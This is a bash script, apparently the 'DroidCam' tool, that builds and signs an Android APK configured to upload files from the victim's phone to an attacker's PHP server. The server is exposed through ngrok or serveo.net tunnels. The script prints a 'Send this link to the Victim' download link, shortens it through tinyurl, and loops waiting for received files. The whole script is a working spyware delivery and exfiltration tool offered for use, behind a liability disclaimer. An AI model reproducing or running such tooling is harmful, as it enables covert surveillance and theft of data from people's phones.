#!/bin/bash
# DroidCam v1.0
# Author: @linux_choice (You don't become a coder by just changing the credits)
# Instagram: @linux_choice
# Github: https://github.com/thelinuxchoice/droidcam

host="159.89.214.31" #Serveo.net
var_ngrok=0
trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {


command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it: apt-get install apksigner. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {

printf "       \e[1;92m  ____            _     _ \e[0m\e[1;77m ____                 \e[0m\n"
printf "       \e[1;92m |  _ \ _ __ ___ (_) __| |\e[0m\e[1;77m/ ___|__ _ _ __ ___   \e[0m\n"
printf "       \e[1;92m | | | | '__/ _ \| |/ _\` |\e[0m\e[1;77m |   / _\` | '_ \` _ \  \e[0m\n"
printf "       \e[1;92m | |_| | | | (_) | | (_| |\e[0m\e[1;77m |__| (_| | | | | | | \e[0m\n"
printf "       \e[1;92m |____/|_|  \___/|_|\__,_|\e[0m\e[1;77m\____\__,_|_| |_| |_|v1.0 \e[0m\n"
                                               
printf "\n"
printf "        \e[1;77mAuthor: https://github.com/thelinuxchoice/droidcam\n\e[0m"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by DroidCam   ::\e[0m\n"
printf "\n"
}



createmain() {

if [[ ! -d app/app/src/main/java/com/droidcam/ ]]; then
mkdir -p app/app/src/main/java/com/droidcam/
fi

ngrok=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"
sed s+forwarding+$ngrok+g  app/mainactivity.java > app/app/src/main/java/com/droidcam/activities/MainActivity.java


}

createmain_serveo() {

if [[ ! -d app/app/src/main/java/com/droidcam/ ]]; then
mkdir -p app/app/src/main/java/com/droidcam/
fi

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"
sed s+forwarding+http://serveo.net:$port+g  app/mainactivity.java  > app/app/src/main/java/com/droidcam/activities/MainActivity.java


}



checkrcv() {



printf "\n"

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"


while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: app/uploadedfiles/\e[0m\n"
rm -rf Log.log
fi
done 

}


server_ngrok() {
if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

php -S "localhost:3333" > /dev/null 2>&1  &
sleep 2
if [[ -e ngrok ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
else

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip

printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
else
printf "\e[1;93m [!] Download Error!\e[0m\n"
exit 1
fi
fi

}

server_serveo() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"


if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

fuser -k 3333/tcp > /dev/null 2>&1
fuser -k 4444/tcp > /dev/null 2>&1
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink' &
sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/app.apk \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/app.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1  &
php -S "localhost:4444" > /dev/null 2>&1  &
sleep 3
checkrcv
}


checkapk() {
if [[ -e app/app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/app/build/outputs/apk/app-release-unsigned.apk app.apk
echo "      " | apksigner sign --ks key.keystore  app.apk > /dev/null

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/app.apk \e[0m\n"
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

if [[ "$var_ngrok" == 1 ]]; then
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s/app.apk\e[0m\n" $link
checkrcv
else
server_serveo
fi
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
source "$HOME/.sdkman/bin/sdkman-init.sh"
sdk use gradle 3.3
cd app/
gradle build
cd ../
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}



forwarding() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1  ]]; then
port_conn
createmain_serveo
build

elif [[ $option_server -eq 2 ]]; then
let var_ngrok=1
server_ngrok
createmain
build
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
forwarding
fi

}

start() {
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
if [[ -e "sendlink" ]]; then
rm -rf sendlink 
fi
if [[ -e "Log.log" ]]; then
rm -rf Log.log 
fi

default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
forwarding
fi


}
banner
dependencies
start
